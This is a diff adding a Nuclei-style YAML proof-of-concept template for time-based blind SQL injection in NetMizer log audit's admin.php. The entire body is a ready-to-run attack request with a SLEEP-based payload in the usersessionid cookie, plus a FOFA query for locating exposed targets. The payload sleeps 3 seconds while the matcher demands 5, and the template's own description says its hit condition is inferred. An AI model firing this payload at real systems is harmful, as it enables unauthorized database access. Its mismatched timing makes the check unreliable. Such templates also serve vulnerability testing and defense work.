@@ -1,0 +1,42 @@
+id: poc-rq0r2m9wuah0gquf
+info:
+  name: NetMizer 日志审计 admin.php sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rq0r2m9wuah0gquf
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rq0r2m9wuah0gquf
+    fofa: title=NetMizer
+http:
+- raw:
+  - 'GET /data/config/admin.php?action=changepw HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: no-cache
+
+    Connection: keep-alive
+
+    Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6; usersessionid=1'' AND (SELECT 1440 FROM (SELECT(SLEEP(3)))bErI) AND ''tGKz''=''tGKz;
+
+    Pragma: no-cache
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
